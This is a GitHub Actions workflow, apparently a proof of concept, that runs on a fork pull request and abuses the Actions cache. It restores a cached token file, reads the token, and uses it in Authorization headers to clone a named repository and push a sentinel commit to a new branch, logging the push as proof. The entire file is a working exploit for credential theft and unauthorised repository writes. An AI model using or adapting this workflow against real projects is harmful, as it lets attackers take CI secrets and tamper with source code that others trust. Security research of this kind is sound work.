name: fork-cache-pr
on: pull_request
permissions:
  contents: read
jobs:
  restore:
    runs-on: ubuntu-24.04
    steps:
      - name: Restore long-lived base token cache
        id: restore
        uses: actions/cache/restore@v4
        with:
          path: cache
          key: apexblack-fork-cache-20260804-ghtoken3
      - name: Use restored token for Git source write
        env:
          CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
        run: |
          set -euo pipefail
          mkdir -p result
          printf "cache-hit=%s\n" "$CACHE_HIT" > result/observation.txt
          if [ ! -s cache/token.txt ]; then
            printf "token-present=no\n" >> result/observation.txt
            cat result/observation.txt
            exit 0
          fi
          printf "token-present=yes\n" >> result/observation.txt
          printf "token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
          token="$(cat cache/token.txt)"
          rm -rf base
          git -c "http.extraheader=Authorization: Bearer $token" clone --depth 1 https://github.com/apexblack-bear-c0dc04/lfs-source-20260804.git base > result/clone.log 2>&1
          cd base
          git config user.name "abwolf9a8c2c0e"
          git config user.email "testingwolf@apexblack.org"
          printf '%s\n' 'fork-pr-ghtoken3-git-write-20260804' > fork-cache-pr-ghtoken3-git-write.txt
          git add fork-cache-pr-ghtoken3-git-write.txt
          git commit -m "fork PR live token git sentinel" > ../result/commit.log 2>&1
          git -c "http.extraheader=Authorization: Bearer $token" push origin HEAD:refs/heads/fork-pr-ghtoken3-cache-proof > ../result/push.log 2>&1
          cd ..
          printf "git-push=success\n" >> result/observation.txt
          cat result/observation.txt
          cat result/push.log
      - name: Upload Git write observation
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fork-cache-pr-ghtoken3-git-observation
          path: result
# Git transport protected source-of-truth consumer
